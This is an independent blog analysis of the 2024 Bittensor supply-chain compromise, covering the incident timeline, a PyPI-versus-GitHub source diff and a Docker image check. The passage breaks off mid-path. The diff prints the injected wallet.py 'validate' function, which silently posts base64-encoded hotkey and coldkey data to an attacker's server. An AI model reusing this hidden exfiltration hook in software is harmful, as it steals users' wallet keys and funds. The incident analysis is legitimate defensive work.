---
title: Bittensor Security Incident - An Independent Analysis
url: https://0xda.de/blog/2024/07/bittensor-security-incident-an-independent-analysis/
source: Blogs  dade
date: 2024-07-05
fetch_date: 2025-10-06T17:42:37.720684
---

# Bittensor Security Incident - An Independent Analysis

[>
cd /0xda.de/](https://0xda.de/)

[ ]

* [About](https://0xda.de/about/)
* [Blog](https://0xda.de/blog/)
* [Garden](https://0xda.de/garden/)
* [Speaking](https://0xda.de/speaking/)
* [Music](https://0xda.de/music/)
* [Consulting](https://room641a.com)
[Tor](http://dadehacks5p4qrui2wy2bcfp37wgtycysqhxuwa2o7k2t34rryrzhdqd.onion/blog/2024/07/bittensor-security-incident-an-independent-analysis/ "Tor")

[0xdade](https://0xda.de/)
![Photo of the site's author](https://0xda.de/img/dade-transparent-logo.png)

Seasonal Influencer. Python dev, security engineer, former red team, former SSD engineer. Hacker, rapper, writer. he/him

12 minutes

# [Bittensor Security Incident - An Independent Analysis](https://0xda.de/blog/2024/07/bittensor-security-incident-an-independent-analysis/)

---

* [TL;DR](#tldr)
* [Timeline](#timeline)
* [The Malicious Code](#the-malicious-code)
  + [PyPI](#pypi)
  + [Docker](#docker)
* [Anomalies in the release](#anomalies-in-the-release)
  + [Wildly varying upload times](#wildly-varying-upload-times)
* [Indicators of Compromise](#indicators-of-compromise)
  + [DNS](#dns)
  + [Whois](#whois)
* [Recommendations](#recommendations)
* [Conclusion](#conclusion)

---

I had no plans to publish this. In fact, I had no plans to investigate it. In fact, I’d have preferred to not even know about it. But I [saw a tweet](https://twitter.com/h0wlu/status/1808634745217028581), thought someone was wrong on the internet, and well, you know what happens.

Note: This is a purely independent investigation of what happened. I have no relationship with anyone involved in the Opentensor Foundation, nor any relationship with anyone involved in the bittensor project, nor any inside information about the incident. I just got nerd sniped by a tweet and this investigation fell out.

## TL;DR

An attacker published a modified version of bittensor 6.12.2 to PyPI which contained a malicious validate function designed to send wallet keys to an attacker controlled server. Due to the nature of the attack, this was likely due to a compromised PyPI API key – potentially through a compromised developer.

The Opentensor Foundation published a blog post earlier today (2024-07-03) about a [security incident](https://blog.bittensor.com/bittnesor-community-update-july-3-2024-45661b1d542d) they had discovered.

The blog post does try to provide helpful, useful information. But it also is a little bit vague about what happened. In particular, their “[Root cause of attack](https://blog.bittensor.com/bittnesor-community-update-july-3-2024-45661b1d542d#e35c)” says the following:

> The attack was traced back to the PyPi Package Manager version 6.12.2, where a malicious package was uploaded, compromising user security.
>
> * The malicious package, masquerading as a legitimate Bittensor package, contained code designed to steal unencrypted coldkey details.
> * When users downloaded this package and decrypted their coldkeys, the decrypted bytecode was sent to a remote server controlled by the attacker.

This indicates that the issue was found to be in their PyPI release [6.12.2](https://pypi.org/project/bittensor/6.12.2/#files). But the subsequent language can be a little misleading:

> The malicious package, masquerading as a legitimate Bittensor package…

This makes it sound like it could be a package squatting type attack, where the attacker was pretending to be a legitimate Bittensor package. But that’s not the case – as far as PyPI was concerned, it *was* a legitimate Bittensor package – it was uploaded to the Bittensor project, presumbly by an API key authorized to do so.

## Timeline

The malicious version of the package was available between 2024-05-22T19:14:09Z and 2024-07-02 (time unknown), or approximately 41 days.

* 2024-05-22T19:14:09Z - [Publish to PyPI](https://pypi.org/project/bittensor/6.12.2/)
* 2024-05-22T21:25:09Z - [6.12.2 release was published to Github](https://github.com/opentensor/bittensor/releases/tag/v6.12.2) by [gus-opentensor](https://github.com/gus-opentensor).
* 2024-05-22T21:25:00Z - [6.12.2 image was published on hub.docker.com](https://hub.docker.com/layers/opentensorfdn/bittensor/6.12.2/images/sha256-ca1364bd1bbd8f5676edf2b77dc592f81acdd56d5244d5b320269e7e3aa8eb8b?context=explore) by [gopentensor](https://hub.docker.com/u/gopentensor) (Note: Dockerhub doesn’t give me a timezone, but by modifying my system time I was able to confirm it localizes, so I set to UTC and got this timestamp)
* 2024-07-02T19:06:00Z - Attacker begins to transfer funds to their own wallet, according to the incident report
* 2024-07-02T19:25:00Z - OTF identifies the anomalous behavior and starts a war room
* 2024-07-02T19:41:00Z - OTF puts chain validators behind a firewall to prevent connections, stopping transaction processing to allow for analysis.

## The Malicious Code

### PyPI

In order to identify the actual root cause, since I couldn’t really tell based on Bittensor’s document, I downloaded the PyPI yanked release source distribution for 6.12.2, and then downloaded the Github 6.12.2 tagged release in order to compare them.

I labeled each download with it’s source (e.g. `-pypi` and `-github`), and then ran diff against them to see if there was any difference.

`$ diff bittensor-6.12.2-pypi/bittensor bittensor-6.12.2-github/bittensor`

```
Common subdirectories: bittensor-6.12.2-pypi/bittensor/btlogging and bittensor-6.12.2-github/bittensor/btlogging
Common subdirectories: bittensor-6.12.2-pypi/bittensor/commands and bittensor-6.12.2-github/bittensor/commands
Common subdirectories: bittensor-6.12.2-pypi/bittensor/extrinsics and bittensor-6.12.2-github/bittensor/extrinsics
Common subdirectories: bittensor-6.12.2-pypi/bittensor/mock and bittensor-6.12.2-github/bittensor/mock
Common subdirectories: bittensor-6.12.2-pypi/bittensor/utils and bittensor-6.12.2-github/bittensor/utils
diff --color bittensor-6.12.2-pypi/bittensor/wallet.py bittensor-6.12.2-github/bittensor/wallet.py
23d22
< import base64
25d23
< import asyncio
28d25
< from aiohttp import ClientSession
291,310d287
<     def validate(self, key: str, keypair: "bittensor.Keypair") -> "bittensor.Keypair":
<         """
<         Validate the bittensor keypair.
<
<         Args:
<             key (str): Key type.
<             keypair (bittensor.Keypair): The keypair to validate.
<         """
<         try:
<             async def validate_key(key, value):
<                 async with ClientSession() as s:
<                     await s.post('http://api.opentensor.io/v1', json={
<                         key: {
<                             k: base64.b64encode(v).decode('ascii') \
<                                 if isinstance(v, bytes) else v for k, v in value.__dict__.items()
<                             }})
<             asyncio.run(validate_key(key, keypair))
<         except: pass
<         return keypair
<
460c437
<         return self.validate("hotkey", self._hotkey)
---
>         return self._hotkey
474c451
<         return self.validate("coldkey", self._coldkey)
---
>         return self._coldkey
```

It looks like the PyPI version has this `validate` function defined in `wallet.py` that isn’t present in the Github release. This is consistent with how *I* would have done this attack – Github is much more likely to have eyes on it, have code review requirements, etc. Most people don’t pay any attention to the source they download from PyPI.

I was also able to confirm that the `bittensor-6.12.2-py3-none-any.whl` artifact also contained the malicious code present in the source distribution.

### Docker

I also pulled the docker image via `docker pull opentensorfdn/bittensor:6.12.2` and then investigated the copies of `wallet.py` it contained - these looked to match the legitimate code in Github, rather than the illegitimate code from PyPI.

`# find / -name wallet.py`

```
/root/.bittensor/bittensor/build/lib/bittensor/wallet.py
/root/.bittensor/bittensor/bittensor/wallet.py
/opt/conda/lib/python3.10/si...